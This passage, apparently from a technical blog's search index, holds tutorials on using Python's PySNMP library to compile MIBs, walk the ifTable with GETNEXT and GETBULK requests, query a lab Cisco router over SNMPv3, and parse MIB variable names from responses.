MIBs: IANAifType-MIB, IF-MIB, SNMPv2-CONF, SNMPv2-MIB, SNMPv2-SMI, SNMPv2-TC\nMissing source MIBs:\nIgnored MIBs:\nFailed MIBs:\n(venv) snmp-testing %\n</code></pre> <p>You can see that I provided a few flags:</p> <ul> <li><code>--generated-mib-texts</code> so that we create a MIB file</li> <li><code>--destination-format pysnmp</code> so that the output file format is in PySNMP, but the other option is JSON</li> <li><code>IF-MIB</code> is the name of the MIB we want to compile. This searches for the IF-MIB.my file in the directory that you're running mibdump.py from</li> </ul> <p>Note</p> <p>Note that you don't need to provide all of the name of the dependency MIB files. PySMI and mibdump.py can interpret IF-MIB.my to learn about these and search for them in the same directory.</p> <p>The output when running mibdump.py shows that the compiled MIB will be placed in the directory /Users/byaklin/.pysnmp/mibs (which PySNMP can search by default), but you can optionally provide a directory with the <code>--destination-directory</code> flag when running mibdump.py.</p> <p>An alternative directory that you could store your compiled MIB file in would be that of where pysnmp is installed. In my case I'm using a Python virtual-environment, so the directory would be venv/lib/python3.9/site-packages/pysnmp/smi/mibs/</p> <p>Now when we go to supply this MIB variable to our SNMP command, we don't need to reference an external source:</p> <pre><code>iterator = getCmd(\n    SnmpEngine(),\n    CommunityData('rostring', mpModel=1),\n    UdpTransportTarget(('192.168.11.201', 161)),\n    ContextData(),\n    ObjectType(ObjectIdentity('IF-MIB', 'ifInOctets', 1))\n)\n</code></pre>","tags":["Python","Automation","SNMP"]},{"location":"2022/01/16/bulk-data-gathering-with-pysnmp-nextcmd-and-bulkcmd/","title":"Bulk Data Gathering with PySNMP nextCmd and bulkCmd","text":"<p>Up until now my articles (PySNMP HLAPI, Compiling MIB's for PySNMP) have focused on using simple SNMP GET requests with PySNMP's getCmd. This works great for simple SNMP queries where you only need one piece of information. When performing gathering of larger data sets with SNMP, issuing single SNMP GET requests for each data point can be very inefficient. Often times you are limited by the latency that exists between the SNMP manager (your script/code) and the SNMP agent running on a network device. In this article we will explore PySNMP's implementation of SNMP GET NEXT and GET BULK using the nextCmd and bulkCmd command generators and how to retrieve the ifTable table of data from an SNMP agent.</p> <p>Note</p> <p>The historical pysnmp project, which has not been maintained due the the unfortunate passing of the maintainer, has since been forked and is being actively maintained (disclaimer, I have yet to test it yet). Most links in my SNMP posts to the PySNMP readthedocs should automatically redirect to the latest documentation, but the technical nature of my posts has not yet been updated. I hope to update these posts so that the community has a good resource to reference for the updated package.</p>","tags":["Python","Automation","SNMP"]},{"location":"2022/01/16/bulk-data-gathering-with-pysnmp-nextcmd-and-bulkcmd/#what-is-iftable","title":"What is ifTable?","text":"<p>ifTable is an SNMP table that represents the interfaces on a remote device (a Cisco router in this article) and meta-data associated with the interfaces. Each column of the table represents meta-data such as:</p> <ul> <li>ifDescr - the description of the interface</li> <li>ifType - the type of interface</li> <li>ifMtu - the MTU of the interface</li> <li>ifSpeed - the speed of the interface</li> <li>ifPhysAddress - the MAC address of the interface (in the case of ethernet)</li> <li>ifAdminStatus - the administrative status (e.g. up/down) of the interface</li> <li>ifOperStatus - the operational status (e.g up/down/testing/unknown/notPresent, etc) of the interface</li> <li>ifInOctets/ifOutOctets - the input and output octets on the interface</li> <li>ifInErrors/ifOutErrors - the input and output errors on the interface</li> <li>Many more! (refer to the ifTable link above for a complete list)</li> </ul> <p>Each row of the table represents an interface on the device and is represented by an ifIndex integer value per interface. For example, ifIndex value of 1 is used for the interface with a description of GigabitEthernet0/0, a value of 2 for GigabitEthernet0/1, and so on.</p> <p>For devices with many interfaces (e.g. a modular or stacked switch), there can be several hundred interfaces with corresponding ifIndex values. You can imagine that querying each one of these interfaces with a SNMP GET request you will be issuing one request per interface per type of meta-data you wish to collect.</p>","tags":["Python","Automation","SNMP"]},{"location":"2022/01/16/bulk-data-gathering-with-pysnmp-nextcmd-and-bulkcmd/#snmp-getnext-requests-with-pysnmp-nextcmd","title":"SNMP GETNEXT Requests with PySNMP nextCmd()","text":"<p>When we used PySNMP's getCmd() function in a (previous article you were expected to provide a MIB name, variable name, and an integer value representing an instance (<code>ObjectIdentity('SNMPv2-MIB', 'sysName', 0)</code>). In some cases this works fine, but in the case of our ifTable example, how are we to know the instance number representing each case? This would mean establishing ObjectIdentity instances for each ifIndex value thats available, but often times we won't know about these ahead of time. We can instead send an SNMP GETNEXT request which allows us to query for data where we may not know this index value, as well as get related sequential data.</p> <p>An SNMP GETNEXT command means that we query for a particular MIB variable instance and the SNMP agent on the remote device will respond not an answer for the OID in the request, but with the OID and value for the next variable in the MIB tree. This works well when querying a table where we may not know what the starting instance index is, because we can start with the MIB variable of the table itself (e.g. ifTable by specifying a PySNMP ObjectType of <code>ObjectType(ObjectIdentity('IF-MIB', 'ifTable'))</code>) and the SNMP avent on the remote device responds with the next available variable in the MIB tree.</p> <p>To explain this behavior further refer to the below image. </p> <p>In the above example we can see the following:</p> <ul> <li>In packet 1 an SNMP GETNEXT query was issued for OID 1.3.6.1.2.1.2.2 which was sent using <code>ObjectType(ObjectIdentity('IF-MIB', 'ifTable'))</code></li> <li>In packet 2 an SNMP get-response of 1.3.6.1.2.1.2.2.1.1.1 was returned which when reviewing the response PySNMP ObjectType instance it is for <code>IF-MIB::ifIndex.1 = 1</code>. This is the first entry underneath ifTable which indicates that there is an index instance of 1 for ifIndex.1</li> <li>In packet 3 an SNMP GETNEXT query was issued for OID 1.3.6.1.2.1.2.2.1.1.1. This at first might seem odd, because its actually the OID that was returned in packet 2. But this is the behavior of SNMP GETNEXT requests; a response packet tells the SNMP manager (your code) what to query next</li> <li>In packet 4, instead of returning the value of OID 1.3.6.1.2.1.2.2.1.1.1 it is returning the next value of 1.3.6.1.2.1.2.2.1.1.2 which when translated is <code>IF-MIB::ifIndex.2 = 2</code></li> </ul> <p>Details of packet 2, the first SNMP GETNEXT response, can be seen in the below screenshot. Looking at the variable-bindings, you can see that there is no binding for the OID of 1.3.6.1.2.1.2.2 (ifTable), but instead a single binding of the next variable in the MIB tree; 1.3.6.1.2.1.2.2.1.1.1 (ifIndex.1).</p> <p></p> <p>To perform an SNMP GETNEXT query with PySNMP and walk an the ifTable, we build our command generator using nextCmd() as follows:</p> <pre><code>iterator = nextCmd(\n    SnmpEngine(),\n    CommunityData('rostring', mpModel=1),\n    UdpTransportTarget(('192.168.11.201', 161)),\n    ContextData(),\n    ObjectType(ObjectIdentity('IF-MIB', 'ifTable')),\n    lexicographicMode=False\n)\n</code></pre> <p>The majority of the code above has been well explained in my PySNMP HLAPI post and are very similar to that of the getCmd() command. The two differences are:</p> <ul> <li>We're now using nextCmd() instead of getCmd()</li> <li>An option of <code>lexicographicMod=False</code> is included</li> </ul> <p><code>lexicographicMode=False</code> is an option that by default is True. What this means is that by default (value=True) we can use the command generator with next() to query from the particular ObjectIdentity that we provided all the way until the end of the MIB. When the end of the MIB is reached a PySNMP StopIteration exception is thrown which we can catch with a try/except clause. When we provide a value of False, this means that PySNMP will return values only within the current heirarchy of what we initially requested. In the example code above, with <code>lexicographicMode=False</code>, we only want to query descendants of ifTable and nothing outside of that tree thats further below in the MIB.</p> <p>To walk the entire ifTable using the nextCmd() command generator shown above, we can loop over the command generator until the StopIteration exception is thrown:</p> <pre><code>MAX_REPS = 500\ncount = 0\nwhile(count &lt; MAX_REPS):\n    try:\n        errorIndication, errorStatus, errorIndex, varBinds = next(iterator)\n        print(varBinds[0].prettyPrint())\n    except StopIteration:\n        break\n\n    count += 1\n</code></pre> <p>Warning</p> <p>I previously wrote the above while() look at a while(True) loop, which probably isn't great. This can result in an infinite loop if the logic within the loop doesn't have a guaranteed break-away. This would normally be the StopIteration exception being seen, but I have now written a fail-safe with an arbitrarily set MAX_REPS value of 500 and a count variable that increments after each loop.</p> <p>Running the above code will result in all varBind variables being printed to screen. It is within this while() loop that you would perform additional handling of the SNMP responses such as storing them in a database, writing them to file, taking action based a response, etc. Running the code above will generate a large number of printed statements showing the entire ifTable contents:</p> <pre><code>IF-MIB::ifIndex.1 = 1\nIF-MIB::ifIndex.2 = 2\nIF-MIB::ifIndex.3 = 3\nIF-MIB::ifIndex.4 = 4\nIF-MIB::ifIndex.5 = 5\nIF-MIB::ifDescr.1 = GigabitEthernet0/0\nIF-MIB::ifDescr.2 = GigabitEthernet0/1\nIF-MIB::ifDescr.3 = GigabitEthernet0/2\nIF-MIB::ifDescr.4 = GigabitEthernet0/3\nIF-MIB::ifDescr.5 = Null0\nIF-MIB::ifType.1 = ethernetCsmacd\nIF-MIB::ifType.2 = ethernetCsmacd\nIF-MIB::ifType.3 = ethernetCsmacd\nIF-MIB::ifType.4 = ethernetCsmacd\nIF-MIB::ifType.5 = other\nIF-MIB::ifMtu.1 = 1500\nIF-MIB::ifMtu.2 = 1500\nIF-MIB::ifMtu.3 = 1500\nIF-MIB::ifMtu.4 = 1500\nIF-MIB::ifMtu.5 = 1500\nIF-MIB::ifSpeed.1 = 1000000000\nIF-MIB::ifSpeed.2 = 1000000000\nIF-MIB::ifSpeed.3 = 1000000000\nIF-MIB::ifSpeed.4 = 1000000000\nIF-MIB::ifSpeed.5 = 4294967295\nIF-MIB::ifPhysAddress.1 = 52:54:00:17:10:3e\nIF-MIB::ifPhysAddress.2 = 52:54:00:17:0b:b4\nIF-MIB::ifPhysAddress.3 = 52:54:00:09:5f:73\nIF-MIB::ifPhysAddress.4 = 52:54:00:04:4d:73\nIF-MIB::ifPhysAddress.5 =\nIF-MIB::ifAdminStatus.1 = up\nIF-MIB::ifAdminStatus.2 = down\nIF-MIB::ifAdminStatus.3 = down\nIF-MIB::ifAdminStatus.4 = down\nIF-MIB::ifAdminStatus.5 = up\nIF-MIB::ifOperStatus.1 = up\nIF-MIB::ifOperStatus.2 = down\nIF-MIB::ifOperStatus.3 = down\nIF-MIB::ifOperStatus.4 = down\nIF-MIB::ifOperStatus.5 = up\nIF-MIB::ifLastChange.1 = 2633\nIF-MIB::ifLastChange.2 = 3010\nIF-MIB::ifLastChange.3 = 3032\nIF-MIB::ifLastChange.4 = 3032\nIF-MIB::ifLastChange.5 = 0\nIF-MIB::ifInOctets.1 = 114294\nIF-MIB::ifInOctets.2 = 0\nIF-MIB::ifInOctets.3 = 0\nIF-MIB::ifInOctets.4 = 0\nIF-MIB::ifInOctets.5 = 0\nIF-MIB::ifInUcastPkts.1 = 1266\nIF-MIB::ifInUcastPkts.2 = 0\nIF-MIB::ifInUcastPkts.3 = 0\nIF-MIB::ifInUcastPkts.4 = 0\nIF-MIB::ifInUcastPkts.5 = 0\nIF-MIB::ifInDiscards.1 = 0\nIF-MIB::ifInDiscards.2 = 0\nIF-MIB::ifInDiscards.3 = 0\nIF-MIB::ifInDiscards.4 = 0\nIF-MIB::ifInDiscards.5 = 0\nIF-MIB::ifInErrors.1 = 0\nIF-MIB::ifInErrors.2 = 0\nIF-MIB::ifInErrors.3 = 0\nIF-MIB::ifInErrors.4 = 0\nIF-MIB::ifInErrors.5 = 0\nIF-MIB::ifInUnknownProtos.1 = 0\nIF-MIB::ifInUnknownProtos.2 = 0\nIF-MIB::ifInUnknownProtos.3 = 0\nIF-MIB::ifInUnknownProtos.4 = 0\nIF-MIB::ifInUnknownProtos.5 = 0\nIF-MIB::ifOutOctets.1 = 9820093\nIF-MIB::ifOutOctets.2 = 0\nIF-MIB::ifOutOctets.3 = 0\nIF-MIB::ifOutOctets.4 = 0\nIF-MIB::ifOutOctets.5 = 0\nIF-MIB::ifOutUcastPkts.1 = 84803\nIF-MIB::ifOutUcastPkts.2 = 0\nIF-MIB::ifOutUcastPkts.3 = 0\nIF-MIB::ifOutUcastPkts.4 = 0\nIF-MIB::ifOutUcastPkts.5 = 0\nIF-MIB::ifOutDiscards.1 = 0\nIF-MIB::ifOutDiscards.2 = 0\nIF-MIB::ifOutDiscards.3 = 0\nIF-MIB::ifOutDiscards.4 = 0\nIF-MIB::ifOutDiscards.5 = 0\nIF-MIB::ifOutErrors.1 = 0\nIF-MIB::ifOutErrors.2 = 0\nIF-MIB::ifOutErrors.3 = 0\nIF-MIB::ifOutErrors.4 = 0\nIF-MIB::ifOutErrors.5 = 0\n</code></pre>","tags":["Python","Automation","SNMP"]},{"location":"2022/01/16/bulk-data-gathering-with-pysnmp-nextcmd-and-bulkcmd/#snmp-getbulk-requests-with-pysnmp-bulkcmd","title":"SNMP GETBULK Requests with PySNMP bulkCmd()","text":"<p>A negative factor when sending SNMP GETNEXT requests is that each MIB variable requires both a request and response packet. When there is a moderate amount of network latency between an SNMP manager and SNMP agent, this can result in unecessary latency. In the ifTable example in the above section, this requires 90 request and 90 response packets and in my local area network (LAN) it took 1.29 seconds to retrieve the entire table.</p> <p>Another SNMP query method is a GETBULK query which is implemnented with PySNMP's bulkCmd() method. SNMP GETBULK queries allow you to request multiple GETNEXT variable bindings in a response packet. For example, issuing a GETBULK with the appropriate parameters can allow you to return the entire ifTable in only a few packets.</p> <p>There are two important parameters that are required when issuing a GETBULK request:</p> <ul> <li>Non-repeaters</li> <li>Max-repetitions</li> </ul> <p>The detailed explanation of how these variables is used in processing an SNMP GETBULK request by an SNMP agent is outlined in RFC1905 section 4.2.3. For our example of querying a table of data, such as ifTable, we're going to keep non-repeaters value as 0 and we will set max-repetitions to the number of variable-bindings we want returned per request. We will be setting max-reptitions to 50. This means that out of the 90 variable-binds we saw in the GETNEXT section above, we should expect two SNMP responses.</p> <p>The below screenshot shows capturing the entire ifTable in two requests and two responses and that this is accomplished in 0.087 seconds. This is significantly quicker than issuing multiple GETNEXT requests, which took 1.29 seconds for all 90 of them.</p> <p></p> <p>Looking at the details of packet 2 in the below screenshot (the first SNMP response packet) you can see that 50 items are included in the variable-bindings section of the packet.</p> <p></p> <p>An interesting aspect of setting the max-repetitions value to 50 is that the second SNMP response packet had 50 variable-bindings in it instead of the 40 that we would have expected (50 variable-bindings from the first response packet and 40 additional ones to represent the ifTable that we already know should be 90 variable-bindings in total). The SNMP agent on the remote device doesn't know that we are only looking for the contents of the ifTable, so instead it grabs the next 10 variable-bindings found after the ifTable within IF-MIB. Thankfully, with PySNMP's lexicographicMode option set to False, these remaining 10 values are ignored when reading the results of varBind.</p> <p>To issue an SNMP GETBULK request with PySNMP we use the bulkCmd() command generator. The two integers below the ContextData() parameter are integers representing the non-repeaters (a value of 0) and max-repetitions (avalue of 50). Following these values we can continue providing the ObjectType() variables we want to query:</p> <pre><code>iterator = bulkCmd(\n    SnmpEngine(),\n    CommunityData('rostring', mpModel=1),\n    UdpTransportTarget(('192.168.11.201', 161)),\n    ContextData(),\n    0, 50,\n    ObjectType(ObjectIdentity('IF-MIB', 'ifTable')),\n    lexicographicMode=False\n)\n</code></pre> <p>Although all variable-bindings were returned in only two packets, we must still parse over all 90 of these using the command generator <code>next(iterator)</code>. How this works is that the first iteration sends the first GETBULK command and the resulting response packet with 50 variable-bindings. The 51st iteration sends the second GETBULK command and the response packet contains the remainder of the variable-bindings (and the 10 discarded variable-bindings at the end we don't care about). This can be accomplished using the same method we saw in the nextCmd() section:</p> <pre><code>MAX_REPS = 500\ncount = 0\nwhile(count &lt; MAX_REPS):\n    try:\n        errorIndication, errorStatus, errorIndex, varBinds = next(iterator)\n        print(varBinds[0].prettyPrint())\n    except StopIteration:\n        break\n\n    count += 1\n</code></pre> <p>When viewing the printed data you can see that the count variable only incremented to 90. So although there were a total of 100 variable-bindings across the two packets, the 10 which we didn't care about we don't iterate over. This is a direct result of setting lexicographicMode to False and exception StopIteration being raised, which stops the while loop:</p> <pre><code>IF-MIB::ifIndex.1 = 1\nIF-MIB::ifIndex.2 = 2\nIF-MIB::ifIndex.3 = 3\nIF-MIB::ifIndex.4 = 4\nIF-MIB::ifIndex.5 = 5\n...\nIF-MIB::ifOutErrors.1 = 0\nIF-MIB::ifOutErrors.2 = 0\nIF-MIB::ifOutErrors.3 = 0\nIF-MIB::ifOutErrors.4 = 0\nIF-MIB::ifOutErrors.5 = 0\n&gt;&gt;&gt; count\n90\n</code></pre>","tags":["Python","Automation","SNMP"]},{"location":"2022/01/16/bulk-data-gathering-with-pysnmp-nextcmd-and-bulkcmd/#where-to-go-next","title":"Where to go next?","text":"<p>This article has covered how to walk SNMP tables and the performance benefit of using PySNMP's getBulk() method to reduce query latency. In this particular case going from 1.29 seconds when using GETNEXT requests to 0.087 seconds with GETBULK requests may not seem like much when querying a single device, but when doing this at across hundreds of devices there is a huge benefit. SNMP tables are found across many different MIB's. Exploring which platform types are in use in your network, what standard or vendor/proprietary MIB's are available should help point you in the right direction for when to use an SNMP GET, GETNEXT, or GETBULK command!</p>","tags":["Python","Automation","SNMP"]},{"location":"2022/01/19/secure-queries-with-snmpv3-and-pysnmp/","title":"Secure Queries with SNMPv3 and PySNMP","text":"<p>The information obtained with SNMP from network devices ranges from being simple timeseries type data like interface metrics to complex and sensitive status information about the features and protocols that the device is running. It is critical to protect this information when in transit between an SNMP agent and manager by utilizing SNMPv3. Sensitive data from network devices being sent in SNMP responses can be used by malicious parties to perform reconnaissance about your environment, learn which protocols and features you utilize, and prepare for a more specific attack based on the information that is learned.</p> <p>Note</p> <p>The historical pysnmp project, which has not been maintained due the the unfortunate passing of the maintainer, has since been forked and is being actively maintained (disclaimer, I have yet to test it yet). Most links in my SNMP posts to the PySNMP readthedocs should automatically redirect to the latest documentation, but the technical nature of my posts has not yet been updated. I hope to update these posts so that the community has a good resource to reference for the updated package.</p> <p>The transit network between a network device that is being queried and the management stations performing the queries (where our Python code is located) often times runs over networks outside of an organizations control. MPLS networks, point-to-point circuits, etc. all are controlled by carriers and vendors and you cannot guarantee the security of their environment. There are many ways in which you can protect the data that flows over these transits (e.g. IPSec), but often times may require complex design changes. While these types of design changes should be considered in the long-run, a quicker way of securing your SNMP queries is by utilizing SNMPv3.</p>","tags":["Python","Automation","SNMP"]},{"location":"2022/01/19/secure-queries-with-snmpv3-and-pysnmp/#what-is-snmpv3","title":"What is SNMPv3?","text":"<p>SNMP v1 and v2c send query and response data in clear-text form (along with the community string, which is supposed to be privileged information!). Anyone that is able to snoop the SNMP packets is able to read the data that is being exchanged. SNMP v3 primary goal is security of the messages/data being exchanged between SNMP managers and agents. It accomplishes this through a few different means:</p> <ul> <li>A user-based security model (USM) for securing SNMP messages with:</li> <li>Authentication - Ensuring that whoever is sending an SNMP query is who they say they are</li> <li>Encryption - Ensuring that the SNMP query and response have not been manipulated in transit</li> <li>A view-based access control model (VACM) for authorizing SNMP users access to specific MIB's on a network device</li> </ul> <p>An additional aspect to SNMPv3's security is the snmpEngineId which is an identifier which must be unique to each SNMP entity. The snmpEngineId value is used by SNMP systems to add protection against message replay, delay and redirection attacks.</p> <p>Each networking manufacturer often defines a default snmpEngineId for each system, sometimes involving the systems MAC address to as to ensure uniqueness. This differs from vendor to vendor. Additionally, I have seen instances where a system two firewalls running in an active/standby cluster both utilize the same snmpEngineId by default which can cause issues for a network management platform trying to treat each system as a separate device. In most cases, networking vendors allow you to adjust the snmpEngineId manually to a value you choose.</p>","tags":["Python","Automation","SNMP"]},{"location":"2022/01/19/secure-queries-with-snmpv3-and-pysnmp/#using-snmpv3-with-pysnmp","title":"Using SNMPv3 with PySNMP","text":"","tags":["Python","Automation","SNMP"]},{"location":"2022/01/19/secure-queries-with-snmpv3-and-pysnmp/#overview","title":"Overview","text":"<p>Pythons PySNMP allows you to provide a UsmUserData object for the authData parameter of its command generators (getCmd, nextCmd and bulkCmd). In my previous articles covering these PySNMP command generators I used a CommunityData object which is used for SNMP v1 or v2c queries. In this article I will focus on creating a UsmUserData object and providing it to the getCmd command generator. We will be using both authentication and privacy</p>","tags":["Python","Automation","SNMP"]},{"location":"2022/01/19/secure-queries-with-snmpv3-and-pysnmp/#example-network-device-snmpv3-configuration","title":"Example Network Device SNMPv3 Configuration","text":"<p>In the example that follows I am using a Cisco IOSv router deployed in a Cisco Modeling Labs (CML) virtual environment. The router is configured for SNMPv3 as follows:</p> <pre><code>snmp-server group v3group v3 priv\nsnmp-server user snmpv3user v3group v3 auth sha myauthpassword priv aes 256 myprivpassword\n</code></pre> <p>Generally speaking, the same SNMPv3 configuration (group, user and passphrases) would be configured across all, or a group of, network devices in your environment. There are all sorts of additional configuration that can be made to control which SNMP MIB views and SNMP contexts that the SNMP group has access to.</p>","tags":["Python","Automation","SNMP"]},{"location":"2022/01/19/secure-queries-with-snmpv3-and-pysnmp/#generating-a-usmuserdata-object","title":"Generating a UsmUserData Object","text":"<p>PySNMP's UsmUserData object is used to build SNMPv3 credentials. It takes the following parameters:</p> <ul> <li>A username matching that which is configured on the Cisco router</li> <li>An authentication protocol object and key</li> <li>An privacy/encryption protocol object and key</li> </ul> <p>There are several additional parameters that UsmUserData takes, but they are not necessary for our SNMP queries and are outside the scope of this article.</p> <p>The authentication and encryption related parameters are actually considered optional. It depends entirely on if your network device is configured for no authentication or privacy (noAuthNoPriv), authentication (authNoPriv), or authentication and privacy (authPriv). The strongest form of security would be through using authentication and privacy together.</p> <p>To create a UsmUserData object that we can use against the network device in my example, we would define it as follows in Python:</p> <pre><code>from pysnmp.hlapi import UsmUserData, usmHMACSHAAuthProtocol, \\\n                         usmAesCfb256Protocol\n\nauth = UsmUserData(\n    userName='snmpv3user',\n    authKey='myauthpassword',\n    authProtocol=usmHMACSHAAuthProtocol,\n    privKey='myprivpassword',\n    privProtocol=usmAesCfb256Protocol\n)\n</code></pre> <p>Because my router is configured for SHA1, the authProtocol is set to <code>usmHMACSHAAuthProtocol</code>. Additionally, the router is using AES256 encryption for privacy so the privProtocol is set to <code>usmAesCfb256Protocol</code>.</p> <p>Available authProtocol options in PySNMP are:</p> <ul> <li>usmNoAuthProtocol (default is authKey not given)</li> <li>usmHMACMD5AuthProtocol (default if authKey is given)</li> <li>usmHMACSHAAuthProtocol</li> <li>usmHMAC128SHA224AuthProtocol</li> <li>usmHMAC192SHA256AuthProtocol</li> <li>usmHMAC256SHA384AuthProtocol</li> <li>usmHMAC384SHA512AuthProtocol</li> </ul> <p>Available privProtocol options in PySNMP are:</p> <ul> <li>usmNoPrivProtocol (default is privhKey not given)</li> <li>usmDESPrivProtocol (default if privKey is given)</li> <li>usm3DESEDEPrivProtocol</li> <li>usmAesCfb128Protocol</li> <li>usmAesCfb192Protocol</li> <li>usmAesCfb256Protocol</li> </ul> <p>There are several additional parameters that UsmUserData takes, but they are not necessary for our SNMP queries and are outside the scope of this article.</p>","tags":["Python","Automation","SNMP"]},{"location":"2022/01/19/secure-queries-with-snmpv3-and-pysnmp/#associating-usmuserdata-with-pysnmp-getcmd-send-a-query","title":"Associating UsmUserData with PySNMP getCmd - Send a Query!","text":"<p>Now that the UsmUserData object has been created and stored as a variable named <code>auth</code>, we can use that to send an SNMP query using the getCmd command generator:</p> <pre><code>from pysnmp.hlapi import SnmpEngine, UdpTransportTarget, ContextData, \\\n                         ObjectType, ObjectIdentity, getCmd\niterator = getCmd(\n    SnmpEngine(),\n    auth,\n    UdpTransportTarget(('192.168.11.201', 161)),\n    ContextData(),\n    ObjectType(ObjectIdentity('SNMPv2-MIB', 'sysName', 0))\n)\n\nerrorIndication, errorStatus, errorIndex, varBinds = next(iterator)\n</code></pre> <p>Note</p> <p>For additional information on what the above statements are doing, please reference my post on using Python and PySNMP's HLAPI to send SNMP queries.</p> <p>In the above example, the <code>auth</code> variable is passed as the second argument to getCmd. The outcome that we expect is that the remote device 192.168.11.201 (my Cisco IOSv lab router) accepted the authentication and privacy protocols and passphrases as well as the username. The contents of varBinds should be the router name:</p> <pre><code>&gt;&gt;&gt; varBinds[0].prettyPrint()\n'SNMPv2-MIB::sysName.0 = Router1.lab.yaklin.ca'\n</code></pre> <p>If you used an authentication protocol that the remote device doesn't support (e.g. usmHMAC384SHA512AuthProtocol instead of usmHMACSHAAuthProtocol) or an incorrect authentication passphrase, the following errorIndication would be seen:</p> <pre><code>&gt;&gt;&gt; errorIndication\nWrongDigest('Wrong SNMP PDU digest')\n</code></pre> <p>In performing two separate tests where I set an incorrect privacy protocol and then set an incorrect privacy passphrase (with the correct privacy protocol), I thought that my router would have indicated an incorrect protocol was used but instead it simply ignored the request and PySNMP waited to time the request out:</p> <pre><code>&gt;&gt;&gt; errorIndication\nRequestTimedOut('No SNMP response received before timeout')\n</code></pre>","tags":["Python","Automation","SNMP"]},{"location":"2022/03/02/parse-pysnmp-object-identities-for-mib-variable-names/","title":"Parse PySNMP Object Identities for MIB Variable Names","text":"<p>After using SNMP to query a remote device for a particular ObjectType and getting the response ObjectType (which includes the MIB identity and the corresponding value), it is useful to be able to programmatically parse the PySNMP ObjectIdentity. This allows you to read the OID hierarchy and get a list human-readable MIB variable names for each node in the list.</p> <p>Note</p> <p>The historical pysnmp project, which has not been maintained due the the unfortunate passing of the maintainer, has since been forked and is being actively maintained (disclaimer, I have yet to test it yet). Most links in my SNMP posts to the PySNMP readthedocs should automatically redirect to the latest documentation, but the technical nature of my posts has not yet been updated. I hope to update these posts so that the community has a good resource to reference for the updated package.</p> <p>For example when querying for the contents of an SNMP table using the PySNMP bulkCmd you will get a large number of ObjectType responses correlating with each variable in the table that you queried. You're most likely going to need to translate these responses into a different data structure; perhaps writing them to different columns in a database table, outputing to CSV file, or some other type of report. It is useful to understand which ObjectIdentity corresponds to which MIB variable name (which might represent your column in a CSV file, such as entPhysicalDescr) and perhaps an index value associated with that ObjectIdentity (e.g. entPhysicalIndex in the entPhysicalTable) as well as the response value. In this article I will be covering PySNMP's ObjectType resolveWithMib() function so that we can read the full hierarchy of the MIB variable.</p> <p>If you're not already familiar with PySNMP's bulkCmd for sending SNMP GETBULK requests check out my previous post to get familiar with querying SNMP tables!</p>","tags":["Python","Automation"]},{"location":"2022/03/02/parse-pysnmp-object-identities-for-mib-variable-names/#getting-started","title":"Getting Started","text":"<p>We're going to focus on using entPhysicalTable in this example. This table contains details on all of the physical components of a particular network device such as the power supplies, fans, modules and their descriptions, serial numbers and other aspects that might be useful. Each hardware component is assigned a unique index value that is called entPhysicalIndex. You'll need a copy of the ENTITY-MIB.my file and we will be following the PySNMP example for the SNMP MIB Browser pretty closely.</p>","tags":["Python","Automation"]},{"location":"2022/03/02/parse-pysnmp-object-identities-for-mib-variable-names/#building-a-mib-browser","title":"Building a MIB Browser","text":"<p>To build our MIB browser we need to import the builder, view, and compiler modules from pysnmp.smi and use them as follows:</p> <pre><code>from pysnmp.smi import builder, view, compiler\n\nMIB_FILE_SOURCE = 'file://.'\n\nmib_builder = builder.MibBuilder()\ncompiler.addMibCompiler(mib_builder, sources=[MIB_FILE_SOURCE, ])\nmib_builder.loadModules('ENTITY-MIB',)\nmib_view = view.MibViewController(mib_builder)\n</code></pre> <p>In the above code we do a few different things:</p> <ul> <li>We import the necessary modules from pysnmp.smi</li> <li>We create a mib_builder class instance</li> <li>With the compiler module we tell PySNMP where to find our ENTITY-MIB.my file (which based on <code>file://.</code> is located in the same folder as where we're running the Python interpreter or our script, but you can specify a different path if your MIB file is located elsewhere). Note that the sources parameter allows you to provide multiple locations for MIB files</li> <li>We then load the ENTITY-MIB.my file into our mib_builder class instance, followed by building a view of that MIB in the mib_view class instance</li> </ul> <p>With PySNMP's MIB builder module we don't need to pre-compile the MIB file into PySNMP format, we can leave it as the plain-text file.</p> <p>You'll see in a later section how we'll use the mib_view class instance, which contains a reference to the ENTITY-MIB, to parse response objects of the entPhysicalTable SNMP table.</p>","tags":["Python","Automation"]},{"location":"2022/03/02/parse-pysnmp-object-identities-for-mib-variable-names/#querying-the-entphysicaltable-snmp-table","title":"Querying the entPhysicalTable SNMP table","text":"<p>I have covered in other articles how to query SNMP tables, so this will just be a quick bit of code to get us started. We are going to query a device at IP address 192.168.11.201 which is a virtual router in my home lab. Unfortunately it doesn't have much in terms of a values in the entPhysicalTablel but will work for this example anyways.</p> <p>The code is as follows:</p> <pre><code>from pysnmp.hlapi import SnmpEngine, UdpTransportTarget,\\\n    ContextData, ObjectType, ObjectIdentity, bulkCmd\nfrom pysnmp.hlapi import CommunityData\nfrom pysnmp.smi import builder, view, compiler\n\nauth = CommunityData('rostring', mpModel=1)\nobject_type = ObjectType(ObjectIdentity(\n    'ENTITY-MIB', 'entPhysicalTable'\n).addAsn1MibSource('file://.'))\n\niterator = bulkCmd(\n    SnmpEngine(),\n    auth,\n    UdpTransportTarget(('192.168.11.201', 161)),\n    ContextData(),\n    0, 200,\n    object_type,\n)\n\nerror_indication, error_status, error_index, var_binds = next(iterator)\n</code></pre> <p>If we take a look at the returned var_binds you can see that there is a single entry. Depending on the network device that you are querying for entPhysicalTable there can be a few values (such as a single value for my virtual router) or hundreds of values (in the case of larger network devices like modular switches):</p> <pre><code>&gt;&gt;&gt; len(var_binds)\n1\n&gt;&gt;&gt; var_binds[0].prettyPrint()\n'ENTITY-MIB::entPhysicalDescr.1 = IOSv chassis, Hw Serial#: 9ZEB8BXGIB6LD28LWUY1O, Hw Revision: 1.0'\n</code></pre>","tags":["Python","Automation"]},{"location":"2022/03/02/parse-pysnmp-object-identities-for-mib-variable-names/#inspecting-objectidentitys-with-a-pysnmp-mib-view","title":"Inspecting ObjectIdentity's with a PySNMP MIB View","text":"<p>In the previous section we were returned a single value for the entPhysicalTable, but lets just assume that we were returned multiple values. What we need to do is be able to parse the <code>ENTITY-MIB::entPhysicalDescr.1</code> ObjectIdentity so that we can identify which particular MIB variable (entPhysicalDescr) and index value the var_bind was for. If you were just to use <code>var_bind[0][0]</code> you would get a string value of the entire OID chain of the variable name:</p> <pre><code>&gt;&gt;&gt; print(var_binds[0][0])\n1.3.6.1.2.1.47.1.1.1.1.2.1\n</code></pre> <p>You could use PySNMP's prettyPrint() function on the ObjectIdentity, but that just gives us the human-readable name of the fully qualified path for the MIB variable:</p> <pre><code>&gt;&gt;&gt; print(var_binds[0][0].prettyPrint())\nENTITY-MIB::entPhysicalDescr.1\n</code></pre> 